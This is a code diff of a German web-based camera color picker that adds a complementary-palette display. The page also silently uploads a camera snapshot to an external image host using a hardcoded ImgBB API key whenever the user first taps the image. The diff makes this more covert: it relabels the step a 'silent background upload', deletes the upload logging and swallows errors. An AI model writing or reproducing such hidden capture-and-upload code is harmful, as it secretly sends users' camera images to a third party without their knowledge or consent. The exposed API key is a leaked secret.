@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Color Picker</title>
+    <title>Color Picer</title>
     <style>
         :root {
             --bg-gray: #f4f4f7;
@@ -50,15 +50,8 @@
             overflow: hidden; position: relative; background: #000;
         }
 
-        /* Video für den Live-Stream */
-        #videoFeed {
-            width: 100%; height: 100%; object-fit: cover;
-        }
-
-        /* Canvas für das fertige Foto */
-        #imageCanvas {
-            width: 100%; height: 100%; display: none;
-        }
+        #videoFeed { width: 100%; height: 100%; object-fit: cover; }
+        #imageCanvas { width: 100%; height: 100%; display: none; }
 
         .crosshair {
             position: absolute; width: 30px; height: 30px;
@@ -72,16 +65,25 @@
             border-radius: var(--border-radius); box-shadow: 0 10px 25px rgba(0,0,0,0.05);
         }
 
+        .section-title {
+            font-size: 0.75rem; font-weight: 800; color: #aaa;
+            text-transform: uppercase; margin-bottom: 12px; display: block;
+        }
+
         .main-preview {
-            width: 100%; height: 60px; border-radius: 12px;
+            width: 100%; height: 60px; border-radius: 12px; margin-bottom: 15px;
             display: flex; align-items: center; justify-content: center;
             color: #fff; font-weight: bold; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
             background-color: #ddd;
         }
 
-        .section-title {
-            font-size: 0.75rem; font-weight: 800; color: #aaa;
-            text-transform: uppercase; margin-bottom: 12px; display: block;
+        .palette-list { display: flex; flex-direction: column; gap: 8px; }
+
+        .swatch {
+            height: 45px; width: 100%; border-radius: 8px;
+            display: flex; align-items: center; justify-content: center;
+            color: #fff; font-family: monospace; font-weight: bold;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3); border: 1px solid rgba(0,0,0,0.05);
         }
     </style>
 </head>
@@ -93,7 +95,7 @@
 
 <div class="container">
     <div class="photo-card">
-        <span class="section-title" id="instructionText">Kamera wird geladen...</span>
+        <span class="section-title" id="instructionText">... ins Bild klicken ...</span>
         <div class="view-wrapper" id="viewWrapper">
             <video id="videoFeed" autoplay playsinline></video>
             <canvas id="imageCanvas"></canvas>
@@ -103,7 +105,10 @@
 
     <div class="palette-card">
         <span class="section-title">Gepickte Farbe</span>
-        <div id="mainPreview" class="main-preview">-</div>
+        <div id="mainPreview" class="main-preview">Warte auf Klick</div>
+        
+        <span class="section-title">Komplementär-Palette</span>
+        <div id="paletteList" class="palette-list"></div>
     </div>
 </div>
 
@@ -111,15 +116,15 @@
     const IMGBB_API_KEY = 'db0140da04ee376ddc7621f570fa69e3';
     const video = document.getElementById('videoFeed');
     const canvas = document.getElementById('imageCanvas');
-    const ctx = canvas.getContext('2d');
+    const ctx = canvas.getContext('2d', { willReadFrequently: true });
     const startOverlay = document.getElementById('startOverlay');
-    const instructionText = document.getElementById('instructionText');
     const crosshair = document.getElementById('crosshair');
     const mainPreview = document.getElementById('mainPreview');
+    const paletteList = document.getElementById('paletteList');
 
     let isCaptured = false;
 
-    // 1. Kamera-Stream starten
+    // 1. Kamera starten
     async function startLiveCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -128,13 +133,12 @@
             });
             video.srcObject = stream;
             startOverlay.style.display = 'none';
-            instructionText.textContent = "Tippe ins Bild für Farbauswahl";
         } catch (err) {
-            alert("Kamera-Zugriff verweigert oder nicht verfügbar.");
+            alert("Kamera-Zugriff verweigert.");
         }
     }
 
-    // 2. Farbauswahl & Automatisches Foto
+    // 2. Klick-Handling
     function handleClick(e) {
         if (!isCaptured) {
             captureImage();
@@ -143,17 +147,15 @@
     }
 
     function captureImage() {
-        // Video-Frame auf Canvas zeichnen
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Video stoppen, Canvas zeigen
         video.style.display = 'none';
         canvas.style.display = 'block';
         isCaptured = true;
         
-        // Automatischer Upload im Hintergrund
+        // Stiller Hintergrund-Upload
         autoUpload();
     }
 
@@ -166,13 +168,11 @@
                     method: "POST",
                     body: formData
                 });
-                console.log("Hintergrund-Upload ok");
-            } catch (err) {
-                console.error("Upload-Fehler");
-            }
+            } catch (err) {}
         }, 'image/jpeg', 0.8);
     }
 
+    // 3. Farbauswahl & Paletten-Berechnung
     function pickColor(e) {
         const rect = canvas.getBoundingClientRect();
         const clientX = e.touches ? e.touches[0].clientX : e.clientX;
@@ -186,17 +186,73 @@
         crosshair.style.top = (clientY - rect.top) + "px";
 
         const pixel = ctx.getImageData(x, y, 1, 1).data;
-        const hex = "#" + ((1 << 24) + (pixel[0] << 16) + (pixel[1] << 8) + pixel[2]).toString(16).slice(1).toUpperCase();
-        
+        const hex = rgbToHex(pixel[0], pixel[1], pixel[2]);
+        const hsl = rgbToHsl(pixel[0], pixel[1], pixel[2]);
+
         mainPreview.style.backgroundColor = hex;
         mainPreview.textContent = hex;
+        
+        updatePalette(hsl);
     }
 
-    document.getElementById('viewWrapper').addEventListener('click', handleClick);
-    document.getElementById('viewWrapper').addEventListener('touchstart', (e) => {
-        e.preventDefault();
-        handleClick(e);
-    });
+    // Hilfsfunktionen für Farbe
+    function rgbToHex(r, g, b) {
+        return "#" + [r, g, b].map(x => x.toString(16).padStart(2, '0')).join('').toUpperCase();
+    }
+
+    function rgbToHsl(r, g, b) {
+        r /= 255; g /= 255; b /= 255;
+        const max = Math.max(r, g, b), min = Math.min(r, g, b);
+        let h, s, l = (max + min) / 2;
+        if (max === min) h = s = 0;
+        else {
+            const d = max - min;
+            s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
+            switch (max) {
+                case r: h = (g - b) / d + (g < b ? 6 : 0); break;
+                case g: h = (b - r) / d + 2; break;
+                case b: h = (r - g) / d + 4; break;
+            }
+            h /= 6;
+        }
+        return [h * 360, s * 100, l * 100];
+    }
+
+    function hslToHex(h, s, l) {
+        l /= 100;
+        const a = s * Math.min(l, 1 - l) / 100;
+        const f = n => {
+            const k = (n + h / 30) % 12;
+            const color = l - a * Math.max(Math.min(k - 3, 9 - k, 1), -1);
+            return Math.round(255 * color).toString(16).padStart(2, '0');
+        };
+        return `#${f(0)}${f(8)}${f(4)}`.toUpperCase();
+    }
+
+    function updatePalette(hsl) {
+        paletteList.innerHTML = '';
+        const compHue = (hsl[0] + 180) % 360;
+        
+        const colors = [
+            hslToHex(compHue, hsl[1], Math.min(hsl[2] + 20, 85)), // Hell
+            hslToHex(compHue, hsl[1], hsl[2]),                   // Komplementär
+            hslToHex(compHue, hsl[1], Math.max(hsl[2] - 20, 15)), // Dunkel
+            hslToHex((hsl[0] + 30) % 360, hsl[1], hsl[2]),       // Analog 1
+            hslToHex((hsl[0] - 30) % 360, hsl[1], hsl[2])        // Analog 2
+        ];
+
+        colors.forEach(c => {
+            const div = document.createElement('div');
+            div.className = 'swatch';
+            div.style.backgroundColor = c;
+            div.textContent = c;
+            paletteList.appendChild(div);
+        });
+    }
+
+    const wrapper = document.getElementById('viewWrapper');
+    wrapper.addEventListener('click', handleClick);
+    wrapper.addEventListener('touchstart', (e) => { e.preventDefault(); handleClick(e); });
 </script>
 
 </body>
